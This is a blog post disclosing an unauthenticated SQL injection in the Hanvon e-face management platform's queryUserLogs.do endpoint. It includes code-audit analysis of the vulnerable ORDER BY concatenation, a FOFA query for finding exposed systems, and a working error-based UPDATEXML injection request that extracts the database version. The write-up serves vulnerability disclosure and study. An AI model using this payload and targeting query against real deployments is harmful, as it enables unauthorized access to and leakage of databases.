---
title: "汉王e脸通综合管理平台 queryUserLogs.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryUserLogs-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryuserlogs.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryUserLogs.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/27 08:35
* 857浏览
* [0评论](#comment)
* 60分钟阅读

深入探索

认证

计算机安全

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryUserLogs.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

网页浏览器

文本剥离工具

恶意软件分析工具

直接看 `SystemLogMgrController` 里关于 `queryUserLogs` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryUserLogs.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson queryUserLogs(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String name, @RequestParam(required = false,value = "begin") String begin, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            this.loginCheck();
            DbPager pager = this.getPager(page, pageSize, columnKey, order);
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            if (begin == null || end == null) {
                Calendar cale = Calendar.getInstance();
                cale.add(2, 0);
                cale.set(5, 1);
                begin = sdf.format(cale.getTime());
                cale.add(2, 1);
                cale.set(5, 0);
                end = sdf.format(cale.getTime());
            }

            Date begin1 = sdf.parse(begin);
            Date end1 = sdf.parse(end);
            begin1 = WorkDateUtils.getStartOfDay(begin1);
            end1 = WorkDateUtils.getEndOfDay(end1);
            Timestamp beginTime = new Timestamp(begin1.getTime());
            Timestamp endTime = new Timestamp(end1.getTime());
            if (name != null && name.trim().length() > 0) {
                name.trim();
            }

            List<UserLogTpm> list = (List)this.logAsm.queryUserLog(beginTime, endTime, name, pager).getResult();
```

跟进`queryUserLog`方法

```
public List<UserLogTpm> queryUserLog(Timestamp beginTime, Timestamp endTime, String queryText, DbPager pager) {
        if (pager == null) {
            pager = new DbPager();
        }

        SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd");

        try {
            beginTime = new Timestamp(fmt.parse(fmt.format(beginTime)).getTime());
            endTime = new Timestamp(fmt.parse(fmt.format(endTime)).getTime() + 86400000L - 1L);
        } catch (Exception var10) {
        }

        SessionalUser su = TheApp.getCurrentUser();
        Long currentUserId = su.getId();
        if (this.systemBsm.hasAdminRole(currentUserId)) {
            currentUserId = null;
        }

        int totalCount = this.logDsm.queryUserLogCount(beginTime, endTime, queryText, currentUserId, pager);
        pager.setRecordCount(totalCount);
        List<UserLogTpm> logList = this.logDsm.queryUserLog(beginTime, endTime, queryText, currentUserId, pager);
        return logList;
    }
```

继续跟进`queryUserLog`方法

```
public interface LogDsm {
    List<UserLogTpm> queryUserLog(@Param("beginTime") Timestamp var1, @Param("endTime") Timestamp var2, @Param("queryText") String var3, @Param("currentUserId") Long var4, @Param("pager") DbPager var5);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 LogDsm.xml

代码安全审计

```
<!-- 查询户日志 -->
    <select id="queryUserLog" resultType="userLogTpm">
        SELECT
        ul.ng_id,
        ul.ng_id as id,
        ul.nt_type as 'type',
        ul.nt_sub_type as subType,
        ul.nt_result as result,
        ul.ts_log as logTime,
        ul.sz_server_code as serverCode,
        ul.sz_title as title,
        ul.tx_comment as comment,
        ul.ng_user_id userId,
        u.sz_name as userName,
        u.sz_employ_id as employId
        FROM sys_user_log ul
        LEFT JOIN sys_user u ON u.ng_id = ul.ng_user_id
        LEFT JOIN sys_user_branch ub on u.ng_id = ub.ng_user_id
        LEFT JOIN sys_branch b on ub.ng_branch_id = b.ng_id
        WHERE ul.ts_log BETWEEN #{beginTime} AND #{endTime}
        <if test="queryText != null and queryText.trim().length() > 0">
            AND (
              u.sz_name LIKE concat('%',#{queryText},'%')
              OR u.sz_employ_id LIKE concat('%',#{queryText},'%')
              OR ul.sz_title LIKE concat('%',#{queryText},'%')
              OR ul.tx_comment LIKE concat('%',#{queryText},'%')
            )
        </if>
        <if test="currentUserId != null">
            AND (b.ng_id IN (
                select distinct ng_branch_id
                from sys_branch_role br
                inner join sys_role r on br.ng_role_id = r.ng_id
                inner join sys_user_role ur on ur.ng_role_id = r.ng_id
                where ur.ng_user_id = #{currentUserId}
            )
            OR ul.ng_user_id = #{currentUserId})
        </if>
        <choose>
            <when test="pager.dbSorts != null and pager.dbSorts.size() > 0">
                <foreach item="item" collection="pager.dbSorts" open="order by " separator=",">
                    ${item.sortField} ${item.sortMode}
                </foreach>
            </when>
            <otherwise>
                order by ts_log desc
            </otherwise>
        </choose>
        limit ${(pager.pageIndex - 1) * pager.pageSize}, ${pager.pageSize}
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/systemLogMgr/queryUserLogs.do?branchId=1&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryUserLogs.do SQL注入漏洞](images/img-001-1347bcf3622e.webp)](https://image.mrxn.net/c8ad718021ab419dafb28e6d40e7ff87.webp)

成功利用报错注入获取到数据库版本号信息

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 queryUserLogs.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryUserLogs-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-queryUserLogs-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryUserLogs-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALjklEQVR4AeybgVIruQ5EOfv//7wvPaJtWWNPhnshpPaZitJSq6Ux1piEUPzz8fHx75/av59frv8MD6hcjQ/R55Nzxk96AOeMTjrOeJWzbqUxL6xacdmcF5qX/zemgTzq9+NddqAN5DHhj7v23Yuv1wU+gMvLACeN+7jQsdG8EM714mcGoxYidl9hrRN313JtG0gmt/97O3AaCMT04YyrZfpOgF5jblUjHkIvXwZjLG5l7p9xpYVzX9fVGggtcPqJUbV3Yuj9YPRn9aeBzESbe90OfMtAICaflw3BQeDsjjQHa03uKd818mUQtdBRvAyCk18NIud+xqq7iiF6AFeyL+W+ZSBfuuIWX+7Ajw3Ed5zRqwCOd0eAqYbAkas1EpiD0ECgctVgzLm26hRDaCHQWiEEByOq7qfsxwbyUwv+r/f9mYH813ftB7+/00B0VFf2bB25bqW9o4HxRwT02H1zn+pbY4Sor7ocVy1gqmHWV7+JilN1OS7SIzwN5GD306/tQBsIcLygwnO8s1qIPtbCGIuH4HzXiJPVeMWJh+gBKBxs1scC4Ph+HRtdI6wcjDUQMWBpQ+DoD8+xFT2cNpCHvx9vsAP/6E74U/P6XQ/9bqictXcQok/WwplT3tcRKr4yiB7AUga0O7uKdA2Zefm2GefcV3CfEO/km+ByIBB3ymydMM/lOwHmGggeaK2B4640kftU3xqIGjijNUb3cHwXXQdxjbt10kHUwBmVl8E5txyICra9fgeWA/HdkZcEMVHnIOKsqb61V+gaaxxD9IeOVWNtxpXGfEbXZc4+xHWtuUIYte6R8areueVALHgj/L9Yyh7Im435HxiPmtcHZ97HDyLn2DUZaw6iBs7oOhhz7pHR2sxVH8Y+cI7dByLneIbuD6GFM87qxEHXKs7mvpnbJyTvxhv47RdDrwViorPpWVNzEDXOCyE4CHRNRulkmZMvTgZRCyicGnC8ZQam+RUJHHW6nsw6CB7639Sdk05W48xB1F9pnJvhPiGzXflF7jQQTVt2tSaIuwACpZfNasTLnIOoAUzdQuC4oyHQReptg8g5ruiajBA15nINRA4Cq8ax0HXyZRA10FF8Nohc5k4Dycntv34H2rssGKcFY6ylQXCru0EamzUQNZVX3hyMGvMzVJ3MOYhaOP/MrxrVVbPGCL2fOddA5MxnhMhZa8wa+zBqzQv3CdEuvJHtgbzRMLSU9ra3HrEaS2yD8chZC8FDx5pzj4xV4zhr7EPvDZi+hcDwxgD4Ul1dF9D6uREE59g1QnNGCK1ytn1CvDtvgm0gENOCEWfr9DRrznxGiH7mco05WGuyXr5rZgjRB0ZUnSzXKJaZg6gR98wgtK7N6FoIDXTMOvkzbRuIkxt/dweWA9EEZXl5imUQU8+56kNopJdBxFWXYwgNBKrOZh1EDs5ojdG1Rug15lZa5Z0zQtQ7nqHqZM7Jt8FYb95a4XIgSm57/Q4sBwLjNPPSPFkYNRAxnH9Jc03uA6F3zmgNRB4w9S3/RNOaPRygvVOC0X+kj4fXZTzIxRNEjysthAYCrRUuB7K43